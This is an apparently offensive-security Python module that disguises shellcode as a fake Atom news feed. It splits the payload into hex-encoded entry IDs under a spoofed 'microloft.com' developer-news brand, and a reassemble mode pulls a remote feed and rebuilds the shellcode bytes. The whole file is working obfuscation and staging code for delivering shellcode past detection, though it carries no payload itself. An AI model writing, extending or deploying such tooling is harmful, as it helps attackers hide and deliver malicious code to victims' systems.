########################################################
### feed Module
### Status: migrated 085
### 
########################################################

import datetime
import feedparser
import random
import urllib.parse
from datetime import timedelta
from utils.const import *
from lxml import etree
from tqdm import tqdm
#from utils.helper import nstate as nstate
from utils.style import *
from utils.helper import GetFileInfo, CheckFile

CATEGORY    = 'obfuscate'
DESCRIPTION = 'Obfuscate shellcodes as XML Feed'

arglist = {
    'input':            { 'value': None, 'desc': 'Input file for feed encoding' },
    'output':           { 'value': None, 'desc': 'Output file for feed encoding' },
    'uri':              { 'value': None, 'desc': 'URI to fake feed' },
    'reassemble':       { 'value': False, 'desc': 'Reassemble fake feed to Shellcode' },
    'feed_author':      { 'value': None, 'desc': 'Author of your fake feed' },
    'feed_title':       { 'value': None, 'desc': 'Title of your fake feed' },
    'feed_subtitle':    { 'value': None, 'desc': 'Subtitle of your fake feed' },
    'feed_uri':         { 'value': None, 'desc': 'URI of your fake feed' }
}

def register_arguments(parser):
    parser.add_argument('-i', '--input', help=arglist['input']['desc'])
    parser.add_argument('-o', '--output', help=arglist['output']['desc'])

    grp = parser.add_argument_group('additional')
    grp.add_argument('-r', '--reassemble', action='store_true', help=arglist['reassemble']['desc'])
    grp.add_argument('-u', '--uri', help=arglist['uri']['desc'])

    fs = parser.add_argument_group('feed settings')
    fs.add_argument('-fa', '--feed-author', default=None, help=arglist['feed_author']['desc'])
    fs.add_argument('-ft', '--feed-title', default=None, help=arglist['feed_title']['desc'])
    fs.add_argument('-fs', '--feed-subtitle', default=None, help=arglist['feed_subtitle']['desc'])
    fs.add_argument('-fu', '--feed-uri', default=None, help=arglist['feed_uri']['desc'])


class module:
    Author = 'psycore8'
    Version = '2.2.5'
    DisplayName = 'FEED-OBF'
    hash = ''
    data_size = 0
    feed_fake_ids = []
    shellcode = ''
    relay_input = False
    relay_output = False
    shell_path = '::obfuscate::feed'

    def __init__(self, input, output, uri, reassemble, feed_author, feed_title, feed_subtitle, feed_uri):
        self.input_file = input
        self.output_file = output
        self.uri = uri
        self.reassemble = reassemble
        self.feed_author = feed_author
        self.feed_title = feed_title
        self.feed_subtitle = feed_subtitle
        self.feed_uri = feed_uri

    def msg(self, message_type, ErrorExit=False):
        messages = {
            'pre.head'       : f'{FormatModuleHeader(self.DisplayName, self.Version)}\n',
            'error.input'    : f'{s_fail} File {self.input_file} not found or cannot be opened.',
            'error.output'   : f'{s_fail} File {self.output_file} not found or cannot be opened.',
            'post.done'      : f'{s_ok} DONE!',
            'proc.input_ok'  : f'{s_ok} File {self.input_file} loaded\n{s_ok} Size of shellcode {self.data_size} bytes\n{s_ok} Hash: {self.hash}',
            'proc.output_ok' : f'{s_ok} File {self.output_file} created\n{s_ok} Size {self.data_size} bytes\n{s_ok} Hash: {self.hash}',
            'proc.input_try' : f'{s_note} Try to open file {self.input_file}',
            'proc.try'       : f'{s_note} Try to generate fake feed',
            'proc.retry'     : f'{s_note} Try to reassemble shellcode'
        }
        print(messages.get(message_type, f'{message_type} - this message type is unknown'))
        if ErrorExit:
            exit()        

    def open_file(self):
        if self.relay_input:
            self.shellcode = self.input_file
        else:
            try:
                #for b in open(self.input_file, 'rb').read():
                #    self.shellcode += b.to_bytes(1, 'big').hex()
                with open(self.input_file, 'rb') as f:
                    self.shellcode = f.read()
                return True
            except FileNotFoundError:
                return False
            
    def ensure_trailing_slash(self, s: str) -> str:
        return s if s.endswith('/') else s + '/'
            
    def generate_fake_title(self):
        diceware_dict = {}
        title_raw = []
        with open(f'{resource_dir}wordlist_en_eff.txt', 'r') as file:
            for line in file:
                key, value = line.strip().split(maxsplit=1)
                diceware_dict[key] = value
        title_length = random.randint(2, 10)
        for i in range(1, title_length):
            dice_roll = ''.join(str(random.randint(1, 6)) for _ in range(5))
            word = diceware_dict.get(dice_roll, 'Nothing found')
            title_raw.append(word)
        return ' '.join(title_raw)
    
    def generate_fake_date(self):
        start_date = datetime.date(2016, 1, 1)
        end_date   = datetime.date.today()
        difference = (end_date - start_date).days
        random_days = random.randint(0, difference)
        random_date = start_date + timedelta(days=random_days)
        return random_date

    def convert_bytes_to_fake_id(self, block_size=16):
        s = self.shellcode#.encode('utf-8')
        self.feed_fake_ids.extend([s[i:i + block_size] for i in range(0, len(s), block_size)])

    def generate_additional_attributes(self):
        if self.feed_uri == None:
            self.feed_uri = 'https://www.microloft.com/'
        else:
            self.feed_uri = self.ensure_trailing_slash(self.feed_uri)
        if self.feed_title == None:
            self.feed_title = 'Developer News'
        if self.feed_subtitle == None:
            self.feed_subtitle = 'The latest developer news from microloft.com'
        if self.feed_author == None:
            self.feed_author = 'Bill Ports'

    def generate_feed(self):
        date_time = datetime.datetime.now()
        root = etree.Element('feed')

        # Header
        feed_link = etree.SubElement(root, 'link', attrib=
                                  {
                                      'href': f'{self.feed_uri}feed.xml',
                                      'rel': 'self',
                                      'type': 'application/atom+xml'
                                      })
        feed_updated = etree.SubElement(root, 'updated')
        feed_updated.text = f'{date_time}'
        feed_id = etree.SubElement(root, 'id')
        feed_id.text = f'{self.feed_uri}feed.xml'
        feed_title = etree.SubElement(root, 'title', attrib={'type': 'html'})
        feed_title.text = f'{self.feed_title}'
        feed_subtitle = etree.SubElement(root, 'subtitle')
        feed_subtitle.text = f'{self.feed_subtitle}'
        feed_author = etree.SubElement(root, 'author')
        feed_author_name = etree.SubElement(feed_author, 'name')
        feed_author_name.text = f'{self.feed_author}'

        # Entries
        i = 1
        #for id in self.feed_fake_ids:
        for id in tqdm(self.feed_fake_ids, desc='IDs'):
            title = self.generate_fake_title()
            date = self.generate_fake_date()
            h = random.randint(0, 23)
            m = random.randint(0, 59)
            time = f'{h:02}:{m:02}'
            entry = etree.SubElement(root, 'entry')
            entry_title = etree.SubElement(entry, 'title', attrib={'type': 'html'})
            #entry_title.text = f'Title {i}'
            entry_title.text = title
            entry_link = etree.SubElement(entry, 'link', attrib={'href': f'{self.feed_uri}0{i}/{random.randint(1, 31)}/{urllib.parse.quote(title)}', 'rel': 'alternate', 'type': 'text/html', 'title': title})
            entry_published = etree.SubElement(entry, 'published')
            entry_published.text = f'{date} {time}'
            entry_updated = etree.SubElement(entry, 'updated')
            entry_updated.text = f'{date} {time}'
            entry_id = etree.SubElement(entry, 'id')
            #entry_id.text = f'{self.feed_uri}{id.decode("utf-8")}' # 16 bytes part of shellcode
            #conv = id.to_bytes(1, 'big').hex()
            conv = id.hex()
            entry_id.text = f'{self.feed_uri}{conv}'
            i += 1

        xml_str = etree.tostring(root, pretty_print=True, xml_declaration=True, encoding="utf-8")
        return xml_str

    def reassemble_shellcode(self):
        feed = feedparser.parse(self.uri)
        for entry in feed.entries:
            pos = entry.id.rfind('/')
            self.shellcode += entry.id[pos + 1:]
        return bytes.fromhex(self.shellcode)

    def output_result(self):
        if self.relay_output:
            return self.shellcode
        else:
            with open(self.output_file, 'wb') as f:
                f.write(self.shellcode)

    def process(self):
        self.msg('pre.head')
        self.generate_additional_attributes()
        if self.reassemble:
            self.msg('proc.retry')
            self.shellcode = self.reassemble_shellcode()
            self.output_result()
        else:
            self.msg('proc.input_try')
            if CheckFile(self.input_file):
                self.data_size, self.hash = GetFileInfo(self.input_file)
                self.open_file()
                self.msg('proc.input_ok')
                self.convert_bytes_to_fake_id()
                self.msg('proc.try')
                self.shellcode = self.generate_feed()
                self.output_result()
            else:
                self.msg('error.input', True)
        if self.relay_output:
            return self.shellcode
        else:
            if CheckFile(self.output_file):
                self.data_size, self.hash = GetFileInfo(self.output_file)
                self.msg('proc.output_ok')
            else:
                self.msg('error.output', True)
        self.msg('post.done')




